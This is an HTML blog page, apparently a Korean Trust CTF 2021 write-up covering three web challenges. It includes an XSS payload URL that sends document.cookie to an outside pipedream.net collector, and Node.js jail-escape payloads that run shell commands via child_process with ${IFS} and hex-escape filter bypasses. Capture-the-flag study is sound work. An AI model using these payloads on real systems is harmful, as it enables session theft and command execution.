@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="오늘은 디미고의 Trust라는 팀에서 CTF를 주최해서 참여를 했었습니다. 개인적인 일도 있고 해서 아침부터 참여하지 못 하고, 오후에 조금 참여를 했습니다.   (Web) babyxss [270 pts] babyxss 문제는 DOMPurify Bypass로 위장한 간단한 XSS 문제입니다.  12345678910111213&lt;?phprequire_o">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Trust CTF 2021 Write Up">
+<meta property="og:url" content="http://example.com/2021/02/28/2021-02-27-Trust-CTF-2021/index.html">
+<meta property="og:site_name" content="Home">
+<meta property="og:description" content="오늘은 디미고의 Trust라는 팀에서 CTF를 주최해서 참여를 했었습니다. 개인적인 일도 있고 해서 아침부터 참여하지 못 하고, 오후에 조금 참여를 했습니다.   (Web) babyxss [270 pts] babyxss 문제는 DOMPurify Bypass로 위장한 간단한 XSS 문제입니다.  12345678910111213&lt;?phprequire_o">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://github.com/wjddnjs33/image/blob/main/TrustCTF/home.png?raw=true">
+<meta property="og:image" content="https://github.com/wjddnjs33/image/blob/main/TrustCTF/jail.png?raw=true">
+<meta property="article:published_time" content="2021-02-28T00:00:10.000Z">
+<meta property="article:modified_time" content="2021-03-14T18:18:44.616Z">
+<meta property="article:author" content="Jeongwon Jo">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="ReDos">
+<meta property="article:tag" content="Javascript">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/wjddnjs33/image/blob/main/TrustCTF/home.png?raw=true">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Trust CTF 2021 Write Up</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2021/03/08/2021-03-08-zer0pts-CTF-2021/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2021/02/10/2021-02-10-CVE-2019-2890/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/02/28/2021-02-27-Trust-CTF-2021/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/02/28/2021-02-27-Trust-CTF-2021/&text=Trust CTF 2021 Write Up"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/02/28/2021-02-27-Trust-CTF-2021/&title=Trust CTF 2021 Write Up"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/02/28/2021-02-27-Trust-CTF-2021/&is_video=false&description=Trust CTF 2021 Write Up"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Trust CTF 2021 Write Up&body=Check out this article: http://example.com/2021/02/28/2021-02-27-Trust-CTF-2021/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/02/28/2021-02-27-Trust-CTF-2021/&title=Trust CTF 2021 Write Up"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/02/28/2021-02-27-Trust-CTF-2021/&title=Trust CTF 2021 Write Up"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/02/28/2021-02-27-Trust-CTF-2021/&title=Trust CTF 2021 Write Up"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/02/28/2021-02-27-Trust-CTF-2021/&title=Trust CTF 2021 Write Up"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/02/28/2021-02-27-Trust-CTF-2021/&name=Trust CTF 2021 Write Up&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/02/28/2021-02-27-Trust-CTF-2021/&t=Trust CTF 2021 Write Up"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-babyxss-270-pts"><span class="toc-number">1.</span> <span class="toc-text"> (Web) babyxss [270 pts]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-FLAG-Checker-1000-pts"><span class="toc-number">2.</span> <span class="toc-text"> (Web) FLAG Checker [1000 pts]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-nodejail-Not-Solve-400-pts"><span class="toc-number">3.</span> <span class="toc-text"> (Web) nodejail (Not Solve) [400 pts]</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Trust CTF 2021 Write Up
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Jeongwon Jo</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-02-28T00:00:10.000Z" itemprop="datePublished">2021-02-28</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Javascript/" rel="tag">Javascript</a>, <a class="tag-link-link" href="/tags/ReDos/" rel="tag">ReDos</a>, <a class="tag-link-link" href="/tags/XSS/" rel="tag">XSS</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p><img src="https://github.com/wjddnjs33/image/blob/main/TrustCTF/home.png?raw=true"></p>
+<p>오늘은 디미고의 Trust라는 팀에서 CTF를 주최해서 참여를 했었습니다. 개인적인 일도 있고 해서 아침부터 참여하지 못 하고, 오후에 조금 참여를 했습니다.</p>
+<hr>
+<h2 id="Web-babyxss-270-pts"><a href="#Web-babyxss-270-pts" class="headerlink" title=" (Web) babyxss [270 pts]"></a><span style="color:#21C587"></span> (Web) babyxss [270 pts]</h2><blockquote>
+<p>babyxss 문제는 DOMPurify Bypass로 위장한 간단한 XSS 문제입니다.</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;secrets.php&quot;</span>);</span><br><span class="line"><span class="comment"># This Challenge using newest version DomPurify..! Maybe unexploitable!!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;content-security-policy: base-uri &#x27;self&#x27;; block-all-mixed-content; connect-src &#x27;self&#x27;;&quot;</span>);</span><br><span class="line">    header(<span class="string">&#x27;X-Frame-Options: DENY&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h1 id=&#x27;name&#x27;&gt;Hello &lt;/h1&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script src=&quot;https://code.jquery.com/jquery-3.5.1.min.js&quot;integrity=&quot;sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script type=&#x27;text/javascript&#x27; src=&#x27;https://cure53.de/purify.js&#x27;&gt;&lt;/script&gt;&lt;script&gt;var name=&#x27;&quot;</span>. base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) .<span class="string">&quot;&#x27;;document.getElementById(&#x27;name&#x27;).innerHTML += DOMPurify.sanitize($(&#x27;&lt;p&gt;&#x27;).html(atob(name)).text())&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+<p>문제로 들어오면 위와 같은 코드가 나오는데 보면 CSP도 걸려 있고, 밑에는 DOMPurify를 이용해서 XSS를 대응하고 있는 것을 볼 수 있습니다. 그래서 그냥 DOMPurify Bypass Payload를 아무 거나 삽입해서 트리거가 되길래 쿠키를 탈취해서 플래그를 얻었습니다.<br></p>
+<p>하지만 트리거가 된 이유는 DOMPurify를 우회해서가 아닙니다. DOMPurify는 최신 버전을 사용하고 있기 때문에 우회하는 건 불가능했습니다. </p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&#x27;&lt;p&gt;&#x27;</span>).html(atob(name)).text()</span><br></pre></td></tr></table></figure>
+<p>하지만 위 코드를 <code>sanitize()</code> 메서드의 인자로 넘겨주고 있는 것을 볼 수 있습니다. 바로 저기서 DOM 내부에 잠시 들어가게 되는데 저때 XSS가 트리거가 되는 것 입니다. 그래서 일반적인 페이로드를 이용해서도 XSS트리거를 할 수 있습니다.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xss.trustctf.xyz&#x2F;?name&#x3D;%3Csvg%3E%3C&#x2F;p%3E%3Cstyle%3E%3Ca%20id&#x3D;%22%3C&#x2F;style%3E%3Cimg%20src&#x3D;1%20onerror&#x3D;location.href&#x3D;%27https:&#x2F;&#x2F;79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net&#x2F;?f&#x3D;%27.concat(document.cookie)%3E%22%3E</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>FLAG : TRUST{cf909172b91c8bf3f70c0e71f2809f36}</p>
+</blockquote>
+<hr>
+<h2 id="Web-FLAG-Checker-1000-pts"><a href="#Web-FLAG-Checker-1000-pts" class="headerlink" title=" (Web) FLAG Checker [1000 pts]"></a><span style="color:#21C587"></span> (Web) FLAG Checker [1000 pts]</h2><blockquote>
+<p>FLAG Checker 문제는 간단한 ReDos 문제입니다. 이론만 저번에 공부하고 처음 해보는데 그냥 신기한 기법인 거 같습니다. </p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Wrong.... <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;./secret.php&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = preg_match(<span class="string">&quot;/<span class="subst">&#123;$_GET[&#x27;flag&#x27;]&#125;</span>/&quot;</span>, <span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$flag</span> === <span class="variable">$_GET</span>[<span class="string">&#x27;answer&#x27;</span>] &amp;&amp; <span class="variable">$result</span> === <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Wrong....&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>문제로 들어오면 위와 같이 나오는데 얼마전에 이런 문제를 본적이 있어서 바로 ReDos가 생각이 났고, 해당 기법으로 슥삭 해주니 플래그가 나왔습니다. 해당 문제와 비슷한 문제가 나중에 webhacking.kr에도 올라온다고 해서 따로 익스 코드는 올리지 않겠습니다.</p>
+<blockquote>
+<p>FLAG : TRUST{2ef0c0b759425eed6d3932c109e0fe74}</p>
+</blockquote>
+<hr>
+<h2 id="Web-nodejail-Not-Solve-400-pts"><a href="#Web-nodejail-Not-Solve-400-pts" class="headerlink" title=" (Web) nodejail (Not Solve) [400 pts]"></a><span style="color:#21C587"></span> (Web) nodejail (Not Solve) [400 pts]</h2><blockquote>
+<p>nodejail 문제는 간단한 제일문제 입니다.</p>
+</blockquote>
+<p><img src="https://github.com/wjddnjs33/image/blob/main/TrustCTF/jail.png?raw=true"></p>
+<p>문제로 들어오면 그냥 입력창 하나가 보입니다. Javasript 코드를 입력해주면 여러가지 문자가 필터링 걸린 것을 확인할 수 있습니다.<br></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">`child_process`</span>).execSync(<span class="string">`c?t<span class="subst">$&#123;IFS&#125;</span>~~`</span>).toString()</span><br></pre></td></tr></table></figure>
+<p>대회 당시에는 위와 같이 ${IFS}를 이용해서 공백을 우회하는 방식을 이용해서 진행하고 있었습니다. 하지만 위와 같이 아무리 해봐도 <code>err</code>만 반환할 분 아무 일도 일어나지 않아 그냥 포기 했었습니다.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">`fs`</span>).readdirSync(<span class="string">`./`</span>)</span><br></pre></td></tr></table></figure>
+<p>대회가 끝나고 승주님에게 물어보니 <code>fs</code> 모듈을 이용해서 디텍터리 탐색을 하는 코드를 받을 수 있었다. 위 코드를 보고 한 참 어이가 없었다. <code>fs</code>를 모듈을 이용해서 파일을 읽고, 쓰고만 되는 줄 알았는데 알고 보니 디렉터리를 탐색할 수 있다는 것을 처음 알았기 때문이다.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">`child_process`</span>).execSync(<span class="string">`\x63at\x20T\x2a`</span>).toString()</span><br></pre></td></tr></table></figure>
+<p>그리고 두 번째는 경준님은 어케 풀었나 궁금해서 물어보니 위와 같이 위와 같이 16진수를 이용해서 공백을 우회한 것을 보고, 또 어이가 없었다..</p>
+<blockquote>
+<p>TRUST{th1s_1s_3xtrem3_n0d3_j41l}</p>
+</blockquote>
+<hr>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-babyxss-270-pts"><span class="toc-number">1.</span> <span class="toc-text"> (Web) babyxss [270 pts]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-FLAG-Checker-1000-pts"><span class="toc-number">2.</span> <span class="toc-text"> (Web) FLAG Checker [1000 pts]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-nodejail-Not-Solve-400-pts"><span class="toc-number">3.</span> <span class="toc-text"> (Web) nodejail (Not Solve) [400 pts]</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/02/28/2021-02-27-Trust-CTF-2021/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/02/28/2021-02-27-Trust-CTF-2021/&text=Trust CTF 2021 Write Up"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/02/28/2021-02-27-Trust-CTF-2021/&title=Trust CTF 2021 Write Up"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/02/28/2021-02-27-Trust-CTF-2021/&is_video=false&description=Trust CTF 2021 Write Up"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Trust CTF 2021 Write Up&body=Check out this article: http://example.com/2021/02/28/2021-02-27-Trust-CTF-2021/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/02/28/2021-02-27-Trust-CTF-2021/&title=Trust CTF 2021 Write Up"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/02/28/2021-02-27-Trust-CTF-2021/&title=Trust CTF 2021 Write Up"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/02/28/2021-02-27-Trust-CTF-2021/&title=Trust CTF 2021 Write Up"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/02/28/2021-02-27-Trust-CTF-2021/&title=Trust CTF 2021 Write Up"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/02/28/2021-02-27-Trust-CTF-2021/&name=Trust CTF 2021 Write Up&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/02/28/2021-02-27-Trust-CTF-2021/&t=Trust CTF 2021 Write Up"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2021
+    Jeongwon Jo
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
